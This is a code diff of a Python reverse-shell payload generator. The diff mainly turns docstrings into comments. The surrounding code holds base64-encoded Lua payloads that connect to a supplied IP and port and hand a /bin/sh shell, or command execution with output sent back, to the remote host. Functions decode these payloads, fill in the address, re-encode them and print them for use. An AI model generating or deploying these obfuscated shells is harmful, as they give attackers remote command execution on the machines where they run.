@@ -57,8 +57,9 @@ shells = {
     "lua" : ['Tk9URTogTGludXggb25seQpsdWEgLWUgInJlcXVpcmUoJ3NvY2tldCcpO3JlcXVpcmUoJ29zJyk7dD1zb2NrZXQudGNwKCk7dDpjb25uZWN0KCd7MH0nLCd7MX0nKTtvcy5leGVjdXRlKCcvYmluL3NoIC1pIDwmMyA+JjMgMj4mMycpOyI=','bHVhNS4xIC1lICdsb2NhbCBob3N0LCBwb3J0ID0gInswfSIsIHsxfSBsb2NhbCBzb2NrZXQgPSByZXF1aXJlKCJzb2NrZXQiKSBsb2NhbCB0Y3AgPSBzb2NrZXQudGNwKCkgbG9jYWwgaW8gPSByZXF1aXJlKCJpbyIpIHRjcDpjb25uZWN0KGhvc3QsIHBvcnQpOyB3aGlsZSB0cnVlIGRvIGxvY2FsIGNtZCwgc3RhdHVzLCBwYXJ0aWFsID0gdGNwOnJlY2VpdmUoKSBsb2NhbCBmID0gaW8ucG9wZW4oY21kLCAiciIpIGxvY2FsIHMgPSBmOnJlYWQoIiphIikgZjpjbG9zZSgpIHRjcDpzZW5kKHMpIGlmIHN0YXR1cyA9PSAiY2xvc2VkIiB0aGVuIGJyZWFrIGVuZCBlbmQgdGNwOmNsb3NlKCkn'],
     
 }
+# Decode and encode payload
 def encode_payload(payload, encoding, ip=None, port=None):
-    """Decode and encode the payload with placeholders replaced."""
+    
     try:
         decoded = base64.b64decode(payload).decode('utf-8')
         if ip and port:
@@ -71,8 +72,8 @@ def encode_payload(payload, encoding, ip=None, port=None):
     except Exception as e:
         return f"Error encoding payload: {e}"
 
+# Generate a specific shell payload.
 def generate_shell(shell_type, encode=None, ip=None, port=None):
-    """Generate a specific shell payload."""
     if shell_type not in shells:
         print(f"{COLORS['RED']}Error: Shell type '{shell_type}' not found.{COLORS['END']}")
         return
@@ -81,16 +82,17 @@ def generate_shell(shell_type, encode=None, ip=None, port=None):
         final_payload = encode_payload(payload, encode, ip, port)
         print(final_payload)
 
+# List all available shell types.
 def list_shells():
-    """List all available shell types."""
     print(f"\n{COLORS['GREEN']}===> Available Shells <==={COLORS['END']}")
     for shell in shells.keys():
         print(f"- {shell.title()}")
 
-# Main Execution
+
 if args.list:
     list_shells()
 
+# Generate all shells
 elif args.all:
     for shell_type in shells.keys():
         generate_shell(shell_type, args.encode, args.ipaddr, args.portnum)
